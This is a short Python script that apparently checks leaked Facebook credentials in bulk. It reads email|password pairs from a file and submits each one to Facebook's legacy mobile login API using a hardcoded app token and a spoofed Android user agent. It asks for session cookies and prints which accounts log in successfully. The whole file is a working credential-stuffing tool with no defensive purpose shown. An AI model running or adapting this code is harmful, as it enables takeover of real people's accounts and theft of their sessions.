import os, sys, json, time, uuid, hashlib, argparse, requests, concurrent.futures

R = '\033[1;91m'
G = '\033[1;32m'
B = '\033[1;94m'
W = '\033[1;97m'

def selenas(empas):
  url = 'https://b-api.facebook.com/method/auth.login'
  nganuid = str(uuid.uuid4())

  data = {
    'email': empas.split('|')[0],
    'password': empas.split('|')[1],
    'credentials_type': 'password',
    'error_detail_type': 'button_with_disabled',
    'format': 'json',
    'device_id': nganuid,
    'generate_session_cookies': 1,
    'generate_analytics_claim': 1,
    'generate_machine_id': 1,
    'method': 'auth.login'
    
  }
  headers = {
    'authority': 'b-api.facebook.com',
    'accept-language': 'en-US,en;q=0.9',
    'authorization': 'OAuth 200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',
    'user-agent': 'Mozilla/5.0 (Linux; Android 6.0; ALE-L21 Build/HuaweiALE-L21; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/68.0.3440.91 Mobile Safari/537.36 [FB_IAB/Orca-Android;FBAV/181.0.0.12.78;]'
    
  }
  
  response = requests.post(url, headers=headers, json=data)

  print(nganuid)
  
  
  if 'session_key' in response.content.decode('utf-8'):
    print(empas + ' - ' + response.json()['uid'])
  else:
    print(empas + ' - ' + response.json()['error_msg'])
    
with concurrent.futures.ThreadPoolExecutor(max_workers=30) as sh:
    e = open('sok.txt').read()
    
    for i, ee in enumerate(e.splitlines()):
        future = sh.submit(selenas, ee)
        future.result()